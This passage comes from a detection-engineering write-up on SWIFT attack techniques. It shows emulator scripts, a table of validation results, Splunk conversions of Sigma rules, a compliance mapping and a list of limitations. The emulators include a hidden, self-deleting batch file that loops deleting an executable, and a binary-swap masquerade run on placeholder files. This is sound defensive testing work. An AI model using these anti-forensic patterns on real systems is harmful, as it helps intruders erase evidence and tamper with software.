"dummy binary content" | Out-File -FilePath $targetExe -Encoding ASCII

$batPath = Join-Path $env:TEMP "evchk.bat"
$batContent = @"
:L1
DEL "$targetExe"
PING 0.0.0.0 > nul
IF EXIST "$targetExe" GOTO L1
DEL "%~f0"
"@
Set-Content -Path $batPath -Value $batContent -Encoding ASCII
Start-Process -FilePath $batPath -WindowStyle Hidden
```

**Rule 8 emulator : binary-swap masquerade:**

```powershell
# binary_swap_sim.ps1
$original = "C:\Allians\nroff.exe"
"legitimate nroff binary placeholder" | Out-File -FilePath $original -Encoding ASCII
Rename-Item -Path $original -NewName "nroff.exe.bak"
"malicious replacement placeholder" | Out-File -FilePath $original -Encoding ASCII
```

> [PHOTO: A screenshot montage : the VM desktop, the Oracle SQL*Plus session showing a successful connection, and Event Viewer filtered to Sysmon Operational log. Good for showing "this is real, not just theory."]

---

## 9. Testing

Every rule below was validated by (1) running its emulator script, (2) confirming the expected Sysmon/Oracle telemetry was actually captured, and (3) converting the rule through pySigma (via sigconverter.io) to real SIEM/EDR query languages.

### 9.1 Rule-by-Rule Validation Results

| Rule | Emulator run | Telemetry confirmed | Result |
|---|---|---|---|
| 1 | `simulate_patch.ps1` against `dummy_host.exe` | Sysmon Event 10: `SourceImage: powershell.exe`, `TargetImage: dummy_host.exe`, `GrantedAccess: 0x1028` | ✅ Confirmed |
| 2 | `simulate_sqlplus_attack.ps1` | Process tree (`cmd.exe` → `sqlplus`) + Oracle audit trail entry, `DBUSERNAME: SYS` | ✅ Confirmed |
| 3 | Manual DELETE via SAAOWNER session | `unified_audit_trail` entry, `ACTION_NAME: DELETE`, full SQL text captured, correct TEXT-then-MESG order | ✅ Confirmed |
| 4 | Manual UPDATE via SAAOWNER session | `unified_audit_trail` entry, `ACTION_NAME: UPDATE`, full SQL text with `MESG_FIN_CCY_AMOUNT` captured | ✅ Confirmed |
| 5 | Dummy SWIFT message generator (mixed content types, running continuously) | Sysmon Event 11, `.prc` files created in `mcm\in\` with real field content | ✅ Confirmed |
| 6 | `secure_delete_sim.ps1` | Sysmon Event 11 (rename inside `Allians\`) + Event 23 (delete of renamed file) : **required discovering FileDelete was never enabled at all, then the crash bug above** | ✅ Confirmed, after fixing 2 real Sysmon defects |
| 7 | `self_delete_batch_sim.ps1` | Full process tree captured: `powershell.exe` → `cmd.exe /c evchk.bat` → `PING.EXE 0.0.0.0`; Event 11 for `.bat` creation in `%TEMP%` | ✅ Confirmed |
| 8 | `binary_swap_sim.ps1` | Event 11 for `nroff.exe` creation (both the pre- and post-swap versions) | ✅ Confirmed |

### 9.2 Vendor-Neutral Conversion Evidence

All 8 rules were converted via **pySigma / sigconverter.io** (a free, open-source tool listed as an official community converter on the SigmaHQ GitHub) to three real backend targets:

| Backend | Result |
|---|---|
| **Splunk (SPL)** | All 8 rules converted successfully, including Rule 6's correlation logic (translated into a `bin`/`stats`/`dc()` windowing idiom) |
| **Microsoft Sentinel (Kusto/KQL)** | Rules 1-5, 7-8 converted successfully. **Rule 6 failed with an explicit backend error: "Backend does not support correlation rules."** This is a genuine, documented limitation of current SIGMA tooling maturity, not a flaw in the rule's logic. |
| **SentinelOne EDR** | All 8 rules converted successfully (note: SentinelOne the EDR product is distinct from Microsoft Sentinel the SIEM : a naming collision worth being explicit about, since sigconverter.io lists the EDR target as `sentinel_one`) |

**Example : Rule 2 converted to Splunk SPL:**
```spl
any where Image:"*\\cmd.exe" and (CommandLine:"*echo exit*" and CommandLine:"*sqlplus*" and CommandLine:"*as sysdba*")
```

**Example : Rule 6's correlation logic converted to Splunk SPL:**
```spl
| multisearch
[ search TargetFilename="*\\Allians\\*" | eval event_type="filecreate" ]
[ search TargetFilename="*\\Allians\\*" | eval event_type="filedelete" ]
| bin _time span=30s
| stats dc(event_type) as event_type_count by _time ComputerName
| search event_type_count >= 2
```

> [PHOTO: Screenshots of the actual sigconverter.io output for at least 2-3 rules : you already have these.]

---

## 10. GRC Mapping

The detection content above is mapped against four frameworks relevant to a financial institution operating SWIFT infrastructure, with two genuinely important gap findings.

| Rule | SWIFT CSCF v2024 | Bank Al-Maghrib 3/W/16 | DNSSI 2023 (Morocco) | ISO/IEC 27002 |
|---|---|---|---|---|
| 1 | **6.2 Software Integrity** : in-memory integrity checking is listed only as an *Optional Enhancement*, not mandatory. **6.5A Intrusion Detection.** | Testing-methodology alignment (grey-box scope, Art. 10) | EXP-JOURN/SURV-CENTR | A.8.16 |
| 2 | **6.4 Logging and Monitoring** : explicitly names "command-line history for privileged operating system accounts" as a *minimum required log* | : | EXP-JOURN/SURV-PRIVIL (nominative privileged accounts) | A.8.15 |
| 3 | **6.3 Database Integrity** : "searches for any unexpectedly deleted records" is also only an *Optional Enhancement* | : | EXP-JOURN/SURV-JOURNAL | A.8.16 |
| 4 | **2.9 Transaction Business Controls** : explicitly names monitoring "exceptionally high amounts" and sequential-numbering gaps as required measures | : | No direct equivalent : DNSSI is a general baseline, not transaction-specific | A.8.16 |
| 6 | No explicit filesystem-level anti-forensic control identified in CSCF at all | Aligned with expected pentest scope (Art. 1, 2) | **INCID-GEST-PREUV** : evidence-preservation/chain-of-custody requirement, directly on point | A.5.28 |
| 7, 8 | **6.2 Software Integrity** (daily-cadence requirement would likely miss a same-day swap-and-revert) | : | EXP-SYS-CONFIG / EXP-SYS-DURC | A.8.32 |

**Two findings worth emphasizing:**

1. **CSCF's own text reveals that the specific control that would have caught the actual 2016 attack technique is optional, not mandatory.** In-memory (vs. at-rest) software integrity checking, and detection of unexpectedly deleted database records, are both listed as "Optional Enhancements" in the current CSCF version. An institution fully compliant with CSCF's *mandatory* tier could remain blind to precisely the technique this incident demonstrated.

2. **Neither CSCF nor DNSSI has an explicit control for filesystem-level anti-forensic techniques.** DNSSI's evidence-preservation requirement (INCID-GEST-PREUV) is the closest applicable control, but it's framed as a post-incident forensic obligation, not a preventive/detective control. Rule 6 fills a real, specific gap in current framework coverage.

> [SCHEMA: A simple visual matrix : rows = rules, columns = the 4 frameworks, colored green/yellow/red for direct match / partial match / no coverage. This is a strong LinkedIn visual.]

---

## 11. Limitations

Stated plainly, not buried:

- **No real Alliance Access.** The validation environment simulates the environment class Alliance Access operates within; it does not include the proprietary application itself, which cannot legally be obtained outside SWIFT membership.
- **False-positive rates are not empirically measured** against production SWIFT-environment traffic, which was not accessible for this project. FP estimates reflect general security-engineering practice, not lab-measured data.
- **Rule 1's GrantedAccess exact-match logic is brittle** : a known limitation of Sysmon ProcessAccess-based detection generally, not unique to this rule.
- **SIGMA correlation-rule backend support is immature** : Rule 6's Kusto conversion failure reflects current tooling maturity and may not persist as the ecosystem develops.
- **The `mcf\` directory's full function is not completely characterized** in this analysis : flagged as an open question.
- **This report has not undergone formal peer review** at the time of publication; a separate, peer-review-track academic version of this work exists as a companion paper (Section 0).

---

## 12. What's Next

- **Formal SigmaHQ submission** : several of these rules (particularly Rule 1 and Rule 6, the two most generalizable behaviors) are strong candidates for submission to the official SigmaHQ public rule repository, following their contribution conventions and providing the real Sysmon telemetry captured here as test evidence.
- **Sysmon FileDelete crash : GitHub issue.** The bug documented in Section 8.3 should be reported to the Sysinternals/Sysmon repository as a stability regression, with the isolated minimal reproduction case, separate from any security-vulnerability framing (this is a crash/DoS finding, not a confirmed exploitable memory-corruption bug).
- **NESTEGG backdoor rule set** : the DOJ complaint documents a fourth malware component (the NESTEGG backdoor: scheduled task → MD5-keyed payload decrypt → firewall modification → listening service) not covered by this rule set; a future extension should build emulators and rules for this install chain.
- **Full characterization of the `mcf\` directory's role** : an open question flagged in Section 8.
- **Empirical false-positive testing** against a live SIEM (Wazuh or an authorized SentinelOne EDR instance) ingesting the same telemetry, rather than the offline log-matching validation used here.
- **Academic peer review** of the companion paper, targeting a Scopus-indexed Q1 venue in the digital forensics/security-applications space.

---

*If you found this useful, the full rule set, lab configuration files, and emulator scripts are available at [GitHub link]. Corrections, especially to the reverse-engineering findings in Sections 3-4, are welcome : open an issue.*
